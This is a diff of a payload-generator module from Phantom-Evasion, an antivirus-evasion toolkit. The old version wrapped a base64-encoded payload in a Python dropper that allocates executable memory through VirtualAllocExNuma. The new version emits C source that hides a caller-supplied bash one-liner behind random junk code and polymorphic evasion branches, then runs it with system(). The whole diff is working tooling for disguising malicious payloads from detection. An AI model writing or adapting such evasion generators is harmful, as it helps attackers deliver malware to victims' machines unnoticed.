@@ -17,53 +17,66 @@
      #   along with Phantom-Evasion.  If not, see <http://www.gnu.org/licenses/>.           #
      #                                                                                      #
      ########################################################################################
- 
+
 import sys
-import string
-from random import randint
+from random import shuffle  
 sys.path.append("Modules/payloads/auxiliar")
-from usefull import python_poly_multipath
 from usefull import varname_creator
-from base64 import b64encode
+from usefull import Junkmathinject
+from usefull import CheckForBackslash
+from usefull import Polymorph_Multipath_Evasion
 
+BashOneliner = CheckForBackslash(sys.argv[1])
 
-
-Pytherpreter = sys.argv[1]
-Filename = sys.argv[2] 
-wine = sys.argv[3]
-
-Pytherpreter= "base64.b64decode(\"" + b64encode(Pytherpreter) + "\")\n"
+Randvarname = varname_creator()
 
 Randptr = varname_creator()
-Randbytesnumb = str(random.randint(1000,9999))
 
-MorphEvasion1 = python_poly_multipath(randint(1,3),1))
-MorphEvasion2 = python_poly_multipath(randint(1,3),2))
-MorphEvasion3 = python_poly_multipath(randint(1,3),3))
+# Random Junkcode 
 
+Junkcode_01 = Junkmathinject()	       
+Junkcode_02 = Junkmathinject()		
+Junkcode_03 = Junkmathinject()		
+Junkcode_04 = Junkmathinject()		
+Junkcode_05 = Junkmathinject()		
+Junkcode_06 = Junkmathinject()		
+Junkcode_07 = Junkmathinject()		
+Junkcode_08 = Junkmathinject()		
+
+MorphEvasion1 = Polymorph_Multipath_Evasion()
+MorphEvasion2 = Polymorph_Multipath_Evasion()
+MorphEvasion3 = Polymorph_Multipath_Evasion()
+MorphEvasion4 = Polymorph_Multipath_Evasion()
 
 Hollow_code = ""
 
-if wine == "True":
+Include_List = ["#include <stdlib.h>\n","#include <unistd.h>\n","#include <stdio.h>\n","#include <string.h>\n","#include <sys/mman.h>\n","#include <math.h>\n"]
 
-    Hollow_code += "import ctypes\n"
-    Hollow_code += "import base64,sys;\n"
-    Hollow_code += MorphEvasion1
-    Hollow_code += MorphEvasion2
-    Hollow_code += MorphEvasion3
-    Hollow_code += "            " + Randptr + " = ctypes.windll.kernel32.VirtualAllocExNuma(ctypes.windll.kernel32.GetCurrentProcess(),ctypes.c_int(0)," + Randbytesnumb + ",ctypes.c_int(0x00001000|0x00002000),ctypes.c_int(0x40),0)\n"
-    Hollow_code += "            if " + Randptr + " != ctypes.c_int(0):\n" 
-    Hollow_code += "                os.system(" + Pytherpreter + ")\n"
-    Hollow_code = Hollow_code.encode('utf-8') 
+shuffle(Include_List)
 
-else:
-    Hollow_code += "import base64,sys;\n"
-    Hollow_code += MorphEvasion1
-    Hollow_code += MorphEvasion2
-    Hollow_code += MorphEvasion3 
-    Hollow_code += "           os.system(" + Pytherpreter + ")\n"
-    Hollow_code = Hollow_code.encode('utf-8') 
+for i in range(0,len(Include_List)):
 
-with open(Filename,'wb') as f:
+    Hollow_code += Include_List[i]
+
+Hollow_code += "int main(int argc,char * argv[]){\n"
+Hollow_code += Junkcode_01
+Hollow_code += MorphEvasion1
+Hollow_code += MorphEvasion2
+Hollow_code += MorphEvasion3
+Hollow_code += MorphEvasion4
+Hollow_code += "void *" + Randptr + ";"
+Hollow_code += Junkcode_02
+Hollow_code += "char " + Randvarname + "[] = \"" + BashOneliner + "\";\n"
+Hollow_code += Junkcode_03
+Hollow_code += Junkcode_04
+Hollow_code += "system(" + Randvarname + ");\n"
+Hollow_code += "}else{" + Junkcode_05 + "}\n"
+Hollow_code += "}else{" + Junkcode_06 + "}\n"
+Hollow_code += "}else{" + Junkcode_07 + "}\n"
+Hollow_code += Junkcode_08 + "}\n"
+Hollow_code += "return 0;}"
+Hollow_code = Hollow_code.encode('utf-8')
+
+with open('Source.c','wb') as f:
     f.write(Hollow_code)
 
